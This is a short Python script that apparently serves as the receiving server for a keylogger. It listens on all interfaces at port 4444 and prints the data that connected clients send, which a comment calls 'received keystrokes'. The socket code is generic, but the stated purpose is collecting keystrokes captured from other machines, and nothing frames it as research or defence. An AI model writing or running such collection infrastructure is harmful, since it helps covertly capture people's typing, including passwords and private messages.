import socket

HOST = "0.0.0.0"   # listen on all interfaces
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

print(f"[*] Listening on {HOST}:{PORT}")

while True:
    client_socket, addr = server.accept()
    print(f"[+] Connection from {addr}")

    while True:
        data = client_socket.recv(1024).decode("utf-8")
        if not data:
            break
        print(data)   # Print received keystrokes
